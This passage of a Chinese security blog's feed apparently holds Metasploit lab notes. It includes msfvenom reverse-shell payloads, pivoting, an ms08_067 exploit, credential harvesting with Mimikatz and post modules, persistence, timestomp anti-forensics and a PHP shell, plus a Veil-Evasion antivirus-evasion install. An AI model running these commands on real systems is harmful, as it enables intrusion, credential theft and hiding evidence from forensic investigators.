class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">文件系统访问会留下痕迹，电子取证重点关注。</span><br><span class="line">渗透测试者与攻击者往往希望销毁文件系统的访问痕迹。</span><br><span class="line">最好的避免被文件取证就是不要触碰文件系统。</span><br><span class="line">meterpreter的优势在于完全基于内存。</span><br><span class="line">MAC 时间（Modified / Accessed / Changed）</span><br><span class="line">M为文件修改时间，A为文件的访问时间，C为文件权限的修改时间</span><br><span class="line"></span><br><span class="line">在系统下修改时间：</span><br><span class="line">ls -l --time=atime/ctime 1.txt # 默认为mtime</span><br><span class="line">stat 1.txt # 列出全部时间</span><br><span class="line">touch -d &quot;2 days ago&quot; 1.txt # 修改MA时间</span><br><span class="line">touch -t 1501010101 1.txt # 修改精确时间，年月日</span><br><span class="line"></span><br><span class="line">在meterpreter下修改时间：</span><br><span class="line">meterpreter &gt; timestomp -v 111 # 查看111文件的MAC时间</span><br><span class="line">timestomp -f C:\\WINDOWS\\0.log 111 # -f为指定一个模板，将111的时间改为0.log的时间</span><br><span class="line"></span><br><span class="line">timestomp -a &quot;11/11/2018 11:11:11&quot; 111 # 指定修改A的时间</span><br><span class="line">timestomp -m &quot;11/11/2018 11:11:11&quot; 111 # 指定修改M的时间</span><br><span class="line">timestomp -c &quot;11/11/2018 11:11:11&quot; 111 # 指定修改M的时间</span><br><span class="line">timestomp -z &quot;11/11/2024 11:11:11&quot; 111 # 一次修改三个时间</span><br><span class="line">timestomp -e &quot;11/11/2020 11:11:11&quot; 111 # 指定修改E(Entry Modified)时间</span><br><span class="line">Entry Modified为MFT，为NTFS的文件系统的主文件分配表</span><br><span class="line">-b -r 为擦除MACE时间表，目前已失效。</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200706141936093.png" class><h3 id="案例六、使用Pivoting（基于路由）实现跳板-枢纽-支点get-shell"><a href="#案例六、使用Pivoting（基于路由）实现跳板-枢纽-支点get-shell" class="headerlink" title="案例六、使用Pivoting（基于路由）实现跳板/枢纽/支点get shell"></a>案例六、使用Pivoting（基于路由）实现跳板/枢纽/支点get shell</h3><h4 id="1-实验拓扑"><a href="#1-实验拓扑" class="headerlink" title="1.实验拓扑"></a>1.实验拓扑</h4><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707152622464.png" class><h4 id="2-实验目的"><a href="#2-实验目的" class="headerlink" title="2.实验目的"></a>2.实验目的</h4><blockquote><p>1.kali使用msf生成名为haha.exe的执行程序，并诱使win_2k03执行，然后反弹给kali一个meterpreter shell。</p><p>2.得到shell后以win_2k03为跳板，控制win_XP。</p></blockquote><h4 id="3-实验过程"><a href="#3-实验过程" class="headerlink" title="3.实验过程"></a>3.实验过程</h4><p>1.配置防火墙m0n01，配置NAT</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707153518682.png" class><p>2.配置WLAN关闭拒绝私有网段访问，使访问其他主机访问192.168.1.4能够实现NAT。</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707153857414.png" class><p>3.配置m0n02规则，允许全部网段可以出去</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707155315502.png" class><p>4.测试</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707155229810.png" class><p>5.生成haha.exe</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o haha.exe</span><br></pre></td></tr></table></figure><p>6.win_2k03下载并访问（诱骗）</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707155813729.png" class><p>7.kali监听，win_2k03运行haha.exe</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q</span><br><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.253.22  # 这里不是192.168.1.4</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707160150775.png" class><p>8.添加到达192.168.254.0的路由，使以后192.168.254.0的路由都走session1</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707162846401.png" class><p>9.扫描网段</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set rhosts 192.168.254.20-192.168.254.30</span><br><span class="line">set ports 139,445</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>可以看到20与22是存活的</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707163857984.png" class><p>10.使用nmap扫描，可以看到添加的路由对nmap没有作用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_nmap -A -p 445 -Pn 192.168.254.22</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707164742663.png" class><p>11.利用ms08067 get XP shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set rhosts 192.168.254.22</span><br><span class="line">set target 34</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>这里win2k03挂了，所以我换了个win7，但出现了个问题。弹出了一个消息点击允许就可以得到shell，但我失败了。。。</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707214348635.png" class><p>来baby让我们换个思路，竟然反弹给win2k03失败，那么能不能反弹给他的上一级m0n0的wlan口，理论上是可以，因为我们已经加了一条192.168.254.0/24的路由，并且网关为session9，尝试一下是可以的。</p><p>这里在连接win2k03的session中一定要加192.168.254.0/24的路由</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707221947516.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set lhost 192.168.1.4</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>已经拿到win_XP的shell</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707221620618.png" class><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707222926242.png" class><p>两个shell都拿到手了。</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707221906308.png" class><p>那么这种情况下的shell并不是从win2k03拿到的，如下图，而是由session 9建立连接，发送XP payload，执行后直接反弹给m0n0的wlan口，并不经过win2k03。</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707223402391.png" class><p>再看一下win2k03（win7）</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707222635457.png" class><p>综上，实验完成。</p><h3 id="案例七、使用Pivoting（基于端口转发）实现跳板-枢纽-支点get-shell"><a href="#案例七、使用Pivoting（基于端口转发）实现跳板-枢纽-支点get-shell" class="headerlink" title="案例七、使用Pivoting（基于端口转发）实现跳板/枢纽/支点get shell"></a>案例七、使用Pivoting（基于端口转发）实现跳板/枢纽/支点get shell</h3><p>删除session 9 的路由</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -d -s 192.168.254.0/24</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707224245019.png" class><p>添加一个端口映射</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -L 192.168.253.22 -l 3389 -r 192.168.254.22 -p 3389</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707224822057.png" class><p>执行，拿到shell。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# rdesktop 192.168.253.22</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707225206502.png" class><p>登入xp会弹警告</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707225911526.png" class><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707230006676.png" class><p>kali连接上的时候xp用户会注销</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707230225787.png" class><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707230115548.png" class><p>完。。。</p><h3 id="案例八，多sessions连接"><a href="#案例八，多sessions连接" class="headerlink" title="案例八，多sessions连接"></a>案例八，多sessions连接</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o a.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.4</span><br><span class="line">set exitonsession # 持续监听4444端口，能够同时获取多个session</span><br><span class="line">run -j -z</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709110800149.png" class><p>使用post模块进行后渗透测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24 #扫描整个网段</span><br><span class="line">run post/windows/gather/checkvm # 扫描虚拟机</span><br><span class="line">run post/windows/gather/credentials/credential_collector #　扫描身份验证信息(账号)token</span><br><span class="line">run post/windows/gather/enum_applications # 扫描安装软件的信息</span><br><span class="line">run post/windows/gather/enum_logged_on_users # 扫描正处于登入的账号(500为管理员)</span><br><span class="line">run post/windows/gather/enum_snmp # 查看snmp相关配置</span><br><span class="line">run post/multi/recon/local_exploit_suggester # 扫描本地可以用于提权的漏洞模块</span><br><span class="line">run post/windows/manage/delete_user USERNAME=a # 删除用户</span><br><span class="line">run post/multi/gather/env # 查看系统环境信息</span><br><span class="line">run post/multi/gather/firefox_creds # 查看火狐浏览器保存的密码</span><br><span class="line">run post/multi/gather/ssh_creds # 查看本地保存的ssh用户名密码信息</span><br><span class="line">run post/multi/gather/check_malware REMOTEFILE=c:\\a.exe # 检查目标系统文件是否为恶意文件</span><br><span class="line">run hostsedit -e 192.168.1.4,www.baidu.com # 修改hosts文件</span><br></pre></td></tr></table></figure><p>设置制动执行脚本，使得到的session进程为explorer</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; set AutorunScript migrate -n explorer.exe</span><br><span class="line">run -j -z</span><br><span class="line"></span><br><span class="line">set InitialAutoRunScript migrate -n explorer.exe</span><br><span class="line">set AutoRunScript post/windows/gather/dumplinks</span><br></pre></td></tr></table></figure><h3 id="案例九，建立持久连接"><a href="#案例九，建立持久连接" class="headerlink" title="案例九，建立持久连接"></a>案例九，建立持久连接</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run metsvc -A # 在目标机器创建一个系统服务并启动</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709150301191.png" class><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709150337750.png" class><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709150449642.png" class><p>连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/metsvc_bind_tcp</span><br><span class="line">set rhost  192.168.1.200</span><br><span class="line">set lport 31337</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>其他方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run persistence -X -r 192.168.1.200 -p 4444 -i 10 # 当XP重启时会重新连接</span><br></pre></td></tr></table></figure><p>重启XP直连</p><h3 id="案例十，MSF延展Mimikatz"><a href="#案例十，MSF延展Mimikatz" class="headerlink" title="案例十，MSF延展Mimikatz"></a>案例十，MSF延展Mimikatz</h3><p>hashdump就是使用mimikatz的部分功能</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">导入</span><br><span class="line">load mimikatz</span><br><span class="line">msv # 查看系统用户信息（hash）</span><br><span class="line">ssp # 查看用户明文信息</span><br><span class="line">tspkg # 票据</span><br><span class="line">wdigest # 可以查看到内存中存在的用户名密码</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709161910259.png" class><p>参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br><span class="line">load mimikatz</span><br><span class="line">wdigest ̵kerberos ̵msv ̵ssp ̵tspkg ̵livessp</span><br><span class="line">mimikatz_command -h</span><br><span class="line">mimikatz_command -f a::  # 查看哪些模块可以使用</span><br><span class="line">mimikatz_command -f samdump::hashes  # </span><br><span class="line">mimikatz_command -f handle::list  # 查看系统进程</span><br><span class="line">mimikatz_command -f service::list # 查看系统服务，可以开启服务也可以停止服务</span><br><span class="line">mimikatz_command -f crypto::listProviders  # 查看支持的加密套件</span><br><span class="line">mimikatz_command -f winmine::infos # 破解扫雷游戏。。。</span><br></pre></td></tr></table></figure><h3 id="案例十一，PHP-shell"><a href="#案例十一，PHP-shell" class="headerlink" title="案例十一，PHP shell"></a>案例十一，PHP shell</h3><p>通过浏览器访问执行php文件拿到shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=3333 -f</span><br><span class="line">raw -o a.php</span><br><span class="line"></span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lport 3333</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>浏览器访问</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709165542747.png" class><p>getshell</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709165601746.png" class><h3 id="案例十二，RFI"><a href="#案例十二，RFI" class="headerlink" title="案例十二，RFI"></a>案例十二，RFI</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">修改PHP配置文件，允许远程包含</span><br><span class="line">vi /etc/php5/cgi/php.ini #php info 配置文件</span><br><span class="line">allow_url_fopen = On</span><br><span class="line">allow_url_include = On</span><br><span class="line"></span><br><span class="line">MSF：</span><br><span class="line">use exploit/unix/webapp/php_include</span><br><span class="line">set RHOST 192.168.1.5</span><br><span class="line">set PATH /dvwa/vulnerabilities/fi/</span><br><span class="line">set PHPURI /?page=XXpathXX  # 不管什么都填XXpathXX</span><br><span class="line">set HEADERS &quot;Cookie:security=low;PHPSESSID=r0p9hepkbrkcn01jjjqldsork2&quot;</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.4</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200711150428027.png" class>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x01-写在前面&quot;&gt;&lt;a href=&quot;#0x01-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x01.写在前面&quot;&gt;&lt;/a&gt;0x01.写在前面&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Metasploit项目&lt;/strong&gt;是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试及入侵检测系统]签名开发。metspolit框架共有四个版本（Metasploit Framework Edition，Metasploit Community Edition，Metasploit Express，Metasploit Pro），MSF为其中的开源免费版本，其他为收费版本，但功能也更加强大。最新的MSF为MSF5.0，5.0提供了新的数据服务，引入了新的免杀功能，支持多种语言。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;免责声明：本文只为学习记录，任何人非法使用产生的任何后果，作者概不负责！！！&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="kali" scheme="https://lunamoore.github.io/categories/kali/"/>
    
    
    <category term="linux" scheme="https://lunamoore.github.io/tags/linux/"/>
    
    <category term="security tools" scheme="https://lunamoore.github.io/tags/security-tools/"/>
    
  </entry>
  
  <entry>
    <title>Veil-Evasion安装</title>
    <link href="https://lunamoore.github.io/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/"/>
    <id>https://lunamoore.github.io/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/</id>
    <published>2020-08-18T06:54:46.000Z</published>
    <updated>2020-08-18T07:33:33.608Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Veil-Evasion简介"><a href="#Veil-Evasion简介" class="headerlink" title="Veil-Evasion简介"></a><span class="exturl" data-url="aHR0cHM6Ly93d3cudmVpbC1mcmFtZXdvcmsuY29tLw==">Veil-Evasion<i class="fa fa-external-link-alt"></i></span>简介</h2><blockquote><p>Veil-Evasion是一种免杀工具，用于生成绕过常见AV的metasploit payload。</p><p>Veil-Evasion被原生设计在kali上，,但kali2020已经需要独立安装。其实存在python环境的系统上应该都能运行。你可以用命令行轻松调用Veil-Evasion，按菜单选项生成payload。在创建payload的时候，Veil-Evasion会询问你是否想把<strong>payload文件用Pyinstaller或者Py2Exe转为可执行文件。</strong></p></blockquote><p><strong>免责声明：本文只为学习记录，任何人非法使用产生的任何后果，作者概不负责！！！</strong></p><a id="more"></a><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="首先更新系统，本次系统为2020-3"><a href="#首先更新系统，本次系统为2020-3" class="headerlink" title="首先更新系统，本次系统为2020.3"></a>首先更新系统，本次系统为2020.3</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update        //更新所有软件包的列表</span><br><span class="line">apt-get upgrade        //更新所有软件</span><br></pre></td></tr></table></figure><h3 id="查看系统详情"><a href="#查看系统详情" class="headerlink" title="查看系统详情"></a>查看系统详情</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># lsb_release -a</span></span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Kali</span><br><span class="line">Description:    Kali GNU/Linux Rolling</span><br><span class="line">Release:        2020.3</span><br><span class="line">Codename:       kali-rolling</span><br><span class="line">root@JIYE:~<span class="comment"># </span></span><br></pre></td></tr></table></figure><h3 id="配置clone加速，需要配置代理。"><a href="#配置clone加速，需要配置代理。" class="headerlink" title="配置clone加速，需要配置代理。"></a>配置clone加速，需要配置代理。</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span> </span><br><span class="line">git config --global https.proxy <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="安装veil"><a href="#安装veil" class="headerlink" title="安装veil"></a>安装veil</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install veil-evasion</span><br><span class="line">veil</span><br></pre></td></tr></table></figure><p><code>由于需要运行windows下的程序，所以需要安装windows系统下的程序</code></p><p><strong><code>默认安装即可</code></strong></p><img src="/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/image-20200814203354313.png" class><img src="/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/image-20200814203452010.png" class><p><strong><code>其他安装略</code></strong></p><h3 id="安装可能会出现错误（我的错误如下），执行以下操作"><a href="#安装可能会出现错误（我的错误如下），执行以下操作" class="headerlink" title="安装可能会出现错误（我的错误如下），执行以下操作"></a><strong>安装可能会出现错误（我的错误如下），执行以下操作</strong></h3><blockquote><p><strong>错误如下，按提示执行命令即可</strong></p><p>[I] If you have any errors running Veil, run: <strong>‘./Veil.py –setup’</strong> and select the nuke the wine folder option</p><p>[I] Done!</p><p>[!] ERROR #2-3: Can’t find the WINE profile for AuotIT v3 (/var/lib/veil/wine//drive_c/Program Files/AutoIt3/Aut2Exe/Aut2exe.exe).   Run:<strong>/usr/share/veil/config/setup.sh –force –silent</strong></p><p>root@JIYE:~# Could not find Wine Gecko. HTML rendering will be disabled.<br>004a:err:mshtml:create_document_object Failed to init Gecko, returning CLASS_E_CLASSNOTAVAILABLE</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/share/veil/ &amp;&amp;./Veil.py --<span class="built_in">set</span> up</span><br><span class="line">/usr/share/veil/config/setup.sh --force --silent</span><br></pre></td></tr></table></figure><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><img src="/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/image-20200815151937202.png" class><h2 id="日后再写使用方式。。。佛系佛系"><a href="#日后再写使用方式。。。佛系佛系" class="headerlink" title="日后再写使用方式。。。佛系佛系"></a>日后再写使用方式。。。佛系佛系</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Veil-Evasion简介&quot;&gt;&lt;a href=&quot;#Veil-Evasion简介&quot; class=&quot;headerlink&quot; title=&quot;Veil-Evasion简介&quot;&gt;&lt;/a&gt;&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cHM6Ly93d3cudmVpbC1mcmFtZXdvcmsuY29tLw==&quot;&gt;Veil-Evasion&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Veil-Evasion是一种免杀工具，用于生成绕过常见AV的metasploit payload。&lt;/p&gt;
&lt;p&gt;Veil-Evasion被原生设计在kali上，,但kali2020已经需要独立安装。其实存在python环境的系统上应该都能运行。你可以用命令行轻松调用Veil-Evasion，按菜单选项生成payload。在创建payload的时候，Veil-Evasion会询问你是否想把&lt;strong&gt;payload文件用Pyinstaller或者Py2Exe转为可执行文件。&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;免责声明：本文只为学习记录，任何人非法使用产生的任何后果，作者概不负责！！！&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="kali" scheme="https://lunamoore.github.io/categories/kali/"/>
    
    
    <category term="linux" scheme="https://lunamoore.github.io/tags/linux/"/>
    
    <category term="security tools" scheme="https://lunamoore.github.io/tags/security-tools/"/>
    
  </entry>
  
  <entry>
    <title>kali设置酸酸乳</title>
    <link href="https://lunamoore.github.io/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/"/>
    <id>https://lunamoore.github.io/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/</id>
    <published>2020-08-16T05:13:04.000Z</published>
    <updated>2020-08-18T07:32:05.172Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>由于经常需要在vm中使用kali，并且要大量下载国外资源，所以没有一个滋润的代理<br>是不能忍受的！你要佛系当我没说。。。下面来解决一下这个问题</p></blockquote><a id="more"></a><h2 id="浏览器代理"><a href="#浏览器代理" class="headerlink" title="浏览器代理"></a>浏览器代理</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a><strong>准备工作</strong></h3><blockquote><p>有可用的SSR账号，可以选择网上免费分享的账号，或者自己在VPS上搭建。</p><p>虚拟机网卡模式为桥接</p></blockquote><h3 id="下载SSR脚本并安装"><a href="#下载SSR脚本并安装" class="headerlink" title="下载SSR脚本并安装"></a><strong>下载SSR脚本并安装</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://lunamoore.github.io/ssr</span><br><span class="line">mv ssr /usr/<span class="built_in">local</span>/bin</span><br><span class="line">chmod 766 /usr/<span class="built_in">local</span>/bin/ssr</span><br><span class="line">ssr install</span><br><span class="line">ssr config</span><br></pre></td></tr></table></figure><h3 id="配置SSR"><a href="#配置SSR" class="headerlink" title="配置SSR"></a><strong>配置SSR</strong></h3><p>一般情况只需要修改以下有注释的地方</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="string">&quot;server&quot;</span>: <span 